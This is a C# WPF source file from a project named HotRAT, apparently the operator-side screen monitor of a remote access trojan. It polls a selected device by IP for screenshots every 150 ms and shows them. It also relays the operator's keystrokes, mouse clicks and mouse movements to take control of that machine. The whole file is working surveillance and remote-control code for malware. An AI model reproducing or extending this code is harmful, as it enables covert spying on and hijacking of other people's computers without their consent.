using Data;
using HotRAT.Server.Pages;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;

namespace HotRAT.Server.Windows
{
    /// <summary>
    /// ScreenMonitor.xaml 的交互逻辑
    /// </summary>
    public partial class ScreenMonitor : Window
    {
        private static ScreenMonitor _instance;
        public static bool RECEIV = false;
        public static bool CONTROL = false;
        string TITLE = $"Display:[{RECEIV}]   Control:[{CONTROL}]";
        private Task longRunningTask;

        public ScreenMonitor()
        {
            InitializeComponent();
            _instance = this;
            Loaded += async (_, _) =>
            {
                if (MainData.SelectDevice == null)
                {
                    Wpf.Ui.Controls.MessageBox msg = new Wpf.Ui.Controls.MessageBox
                    {
                        Content = "No valid instance has been selected.",
                        Title = "Error!!!                 ",
                        Height = 200,
                        Width = 500
                    };
                    await msg.ShowDialogAsync();
                    this.Close();
                }
            };
        }


        public static async Task SetFrameWebViewAsync(string base64)
        {
            try
            {
                byte[] imageBytes = Convert.FromBase64String(base64);
                BitmapImage bitmap = new BitmapImage();

                using (MemoryStream ms = new MemoryStream(imageBytes))
                {
                    bitmap.BeginInit();
                    bitmap.StreamSource = ms;
                    bitmap.CacheOption = BitmapCacheOption.OnLoad;
                    bitmap.EndInit();
                }

                await _instance.Dispatcher.InvokeAsync(() =>
                {
                    try
                    {
                        ImageBrush brush = new ImageBrush
                        {
                            ImageSource = bitmap
                        };
                        _instance.Display.Background = brush;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private async void start_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            Log.AddLog((!start.IsOn).ToString(), Data.SoftWareSettings.LightFontColor);
            if (start.IsOn)
            {
                RECEIV = false;
                title.Text = TITLE;
                Log.AddLog("停止请求", Data.SoftWareSettings.LightFontColor);
            }
            else
            {
                RECEIV = true;
                longRunningTask = KeepGetFrame();
                title.Text = TITLE;
                Log.AddLog("开始请求", Data.SoftWareSettings.LightFontColor);
            }
        }

        private static async Task KeepGetFrame()
        {
            while (RECEIV)
            {
                await MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, "SM|||GET");
                await Task.Delay(150);
                if (RECEIV == false)
                {
                    break;
                }
            }
        }

        private async void GetFrame_Click(object sender, RoutedEventArgs e)
        {
            if (MainData.SelectDevice == null) return;
            
            await MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, "SM|||GET");
        }

        private async void control_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            Brush brush;
            if (SoftWareSettings.IsLight)
                brush = SoftWareSettings.LightFontColor;
            else
                brush = SoftWareSettings.DarkFontColor;
            Log.AddLog((!control.IsOn).ToString(), brush);
            if (control.IsOn)
            {
                CONTROL = false;
                Log.AddLog("停止控制", brush);
            }
            else
            {
                CONTROL = true;
                Log.AddLog("开始控制", brush);
            }
        }

        private async void Display_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            if (!CONTROL) return;

            await MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, $"CON|||KEY|||{e.Key.ToString()}");
        }

        private async void Display_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (!CONTROL) return;

            await MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, $"CON|||MOUSE|||{e.ChangedButton.ToString()}DOWN");
        }

        private async void Display_MouseUp(object sender, MouseButtonEventArgs e)
        {
            if (!CONTROL) return;

            await MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, $"CON|||MOUSE|||{e.ChangedButton.ToString()}UP");
        }

        private async void Display_MouseMove(object sender, MouseEventArgs e)
        {
            if (!CONTROL) return;

            Point position = e.GetPosition(Display);

            double actualWidth = Display.RenderSize.Width;
            double actualHeight = Display.RenderSize.Height;

            double scaledX = (position.X / actualWidth) * 1920;
            double scaledY = (position.Y / actualHeight) * 1080;

            string command = $"CON|||MOUSEMOVE|||{scaledX:F0}|||{scaledY:F0}";
            await MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, command);
        }
    }
}
